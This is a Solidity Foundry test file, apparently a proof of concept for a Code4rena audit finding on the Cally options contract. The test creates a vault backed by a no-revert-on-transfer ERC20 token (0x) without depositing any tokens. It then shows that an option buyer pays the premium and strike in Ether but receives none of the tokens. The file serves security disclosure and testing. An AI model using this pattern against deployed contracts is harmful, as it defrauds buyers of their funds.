
/*

no-revert-on-transfer ERC20 tokens can be drained

https://github.com/code-423n4/2022-05-cally-findings/issues/89

*/

pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "../shared/Fixture.t.sol";

import "src/Cally.sol";


contract h1 is Test, Fixture {

function testStealFunds() public {
    // address of 0x on mainnet
    address t = address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
    vm.startPrank(babe);
    require(ERC20(t).balanceOf(babe) == 0);
    uint vaultId = c.createVault(100, t, 1, 1, 1, 0, Cally.TokenType.ERC721);
    // check that neither the Cally contract nor the vault creator
    // had any 0x tokens
    require(ERC20(t).balanceOf(babe) == 0);
    require(ERC20(t).balanceOf(address(c)) == 0);
    // check whether vault was created properly
    Cally.Vault memory v = c.vaults(vaultId);
    require(v.token == t);
    require(v.tokenIdOrAmount == 100);
    vm.stopPrank();
    // So now there's a vault for 100 0x tokens although the Cally contract doesn't
    // have any.
    // If someone buys & exercises the option they won't receive any tokens.
    uint premium = 0.025 ether;
    uint strike = 2 ether;
    require(address(c).balance == 0, "shouldn't have any balance at the beginning");
    require(payable(address(this)).balance > 0, "not enough balance");
    uint optionId = c.buyOption{value: premium}(vaultId);
    c.exercise{value: strike}(optionId);
    // buyer of option (`address(this)`) got zero 0x tokens
    // But buyer lost their Ether
    require(ERC20(t).balanceOf(address(this)) == 0);
    require(address(c).balance > 0, "got some money");
}

}